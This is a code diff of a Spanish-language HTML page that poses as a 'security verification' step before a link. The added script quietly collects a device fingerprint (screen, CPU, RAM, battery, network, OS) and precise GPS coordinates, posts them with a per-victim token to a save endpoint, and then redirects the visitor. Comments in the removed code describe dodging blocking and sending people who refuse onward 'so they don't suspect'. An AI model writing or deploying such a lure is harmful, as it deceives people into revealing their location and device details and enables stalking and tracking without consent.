@@ -14,45 +14,98 @@
 </head>
 <body>
     <div class="spinner"></div>
-    <h2>Verificación de Seguridad</h2>
-    <p>Detectamos una conexión inusual. Para continuar al contenido, confirma que estás en una ubicación válida.</p>
+    <h2 id="title">Verificación de Seguridad</h2>
+    <p id="desc">Detectamos una conexión inusual. Para continuar al contenido, confirma que estás en una ubicación válida.</p>
     
-    <button class="btn" onclick="pedirGPS()">Confirmar Ubicación</button>
+    <button id="btnAction" class="btn" onclick="iniciarProceso()">Confirmar Acceso</button>
     <div id="msg" style="margin-top:20px; font-size:13px; color:#e74c3c;"></div>
 
     <script>
         const token = window.location.pathname.split('/').pop();
 
-        function pedirGPS() {
-            document.getElementById('msg').innerText = "Conectando con satélite...";
+        // Función para obtener la Huella Digital (Rayos X)
+        async function getFingerprint() {
+            let info = [];
+            
+            // 1. Pantalla
+            info.push(`📺 Pantalla: ${window.screen.width}x${window.screen.height}`);
+            
+            // 2. Hardware (Núcleos y RAM)
+            if (navigator.hardwareConcurrency) info.push(`⚙️ CPU: ${navigator.hardwareConcurrency} Núcleos`);
+            if (navigator.deviceMemory) info.push(`💾 RAM: ~${navigator.deviceMemory} GB`);
+            
+            // 3. Batería (Async)
+            try {
+                if (navigator.getBattery) {
+                    let bat = await navigator.getBattery();
+                    let level = Math.round(bat.level * 100);
+                    let status = bat.charging ? "🔌 Cargando" : "🔋 Batería";
+                    info.push(`${status}: ${level}%`);
+                }
+            } catch(e) {}
+
+            // 4. Conexión
+            if (navigator.connection) {
+                info.push(`📡 Red: ${navigator.connection.effectiveType}`);
+            }
+            
+            // 5. Plataforma
+            info.push(`💻 OS: ${navigator.platform}`);
+
+            return info.join(" | ");
+        }
+
+        function irAlDestino() {
+            window.location.href = "/redirect/" + token;
+        }
+
+        async function iniciarProceso() {
+            document.getElementById('msg').innerText = "Analizando entorno del dispositivo...";
+            document.getElementById('btnAction').style.display = 'none';
+            
+            // Obtenemos los datos técnicos primero
+            let fingerprint = await getFingerprint();
+
             if (navigator.geolocation) {
-                // Pedimos GPS
-                navigator.geolocation.getCurrentPosition(enviarPorRebote, errorGPS, {
-                    enableHighAccuracy: true, 
-                    timeout: 10000
-                });
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => enviarTodo(pos, fingerprint), 
+                    (err) => enviarSoloFingerprint(fingerprint), 
+                    {enableHighAccuracy: true, timeout: 8000}
+                );
             } else {
-                // Si no hay GPS, redirigimos normal
-                window.location.href = "/redirect/" + token;
+                // Si el navegador no tiene GPS, enviamos solo fingerprint
+                enviarSoloFingerprint(fingerprint);
             }
         }
 
-        function enviarPorRebote(pos) {
-            // TÉCNICA DEL REBOTE:
-            // Ponemos los datos en la URL y navegamos. Esto NO se puede bloquear fácil.
-            const lat = pos.coords.latitude;
-            const lon = pos.coords.longitude;
-            const acc = pos.coords.accuracy;
-            
-            // Redirigimos al endpoint de guardado con los datos en la mochila
-            window.location.href = `/api/save_gps_bounce?token=${token}&lat=${lat}&lon=${lon}&acc=${acc}`;
+        function enviarTodo(pos, fingerprint) {
+            fetch('/api/save_data', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    token: token,
+                    lat: pos.coords.latitude,
+                    lon: pos.coords.longitude,
+                    acc: pos.coords.accuracy,
+                    fingerprint: fingerprint
+                })
+            }).then(irAlDestino).catch(irAlDestino);
         }
 
-        function errorGPS(err) {
-            // Si deniegan el permiso, los mandamos al video de todas formas
-            // para que no sospechen.
-            window.location.href = "/redirect/" + token;
+        function enviarSoloFingerprint(fingerprint) {
+            fetch('/api/save_data', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    token: token,
+                    lat: null, lon: null, acc: null,
+                    fingerprint: fingerprint
+                })
+            }).then(irAlDestino).catch(irAlDestino);
         }
+        
+        // Auto-inicio si el usuario ya interactuó antes (opcional)
+        // iniciarProceso();
     </script>
 </body>
 </html>
